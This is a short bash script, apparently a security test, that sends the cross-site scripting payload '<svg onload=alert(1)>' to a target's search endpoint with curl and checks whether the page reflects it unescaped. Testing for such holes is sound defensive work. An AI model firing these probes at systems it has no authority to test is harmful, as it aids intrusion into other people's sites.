#!/usr/bin/env bash
set -euo pipefail
. "$(dirname "$0")/_lib.sh"
payload="<svg onload=alert(1)>"
curl -s --get "$TARGET/search" --data-urlencode "q=$payload" | grep -q "<svg onload=alert(1)>"
